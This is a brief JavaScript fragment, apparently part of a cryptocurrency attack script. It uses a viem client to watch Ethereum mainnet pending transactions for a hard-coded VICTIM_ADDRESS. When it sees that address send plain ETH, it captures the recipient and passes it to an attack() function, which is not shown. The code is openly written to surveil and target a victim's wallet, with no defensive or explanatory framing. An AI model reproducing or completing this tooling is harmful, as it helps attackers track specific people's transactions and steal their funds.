


// Watch victim address, get transfer address
const publicClient = createPublicClient({
  chain: mainnet,
  transport: http(),
});
const unwatch = publicClient.watchPendingTransactions({
  poll: false,
  onTransactions: (hashes) => {
    console.log(`watching victim address ${VICTIM_ADDRESS}`);
    // handlePendingTransaction(hashes);
  },
  onError: (error) => {
    console.error(error);
  },
});

const handlePendingTransaction = (hashs) => {
  hashs.forEach(async (hash) => {
    const transaction = await publicClient.getTransaction({
      hash,
    });
    // 0x means eth transfer
    if (transaction.from === VICTIM_ADDRESS && transaction.input === "0x") {
      console.log("victim transfer address: ", transaction.to);
      attack({ VICTIM_ADDRESS, transferAddress: transaction.to });
      unwatch();
    }
  });
};
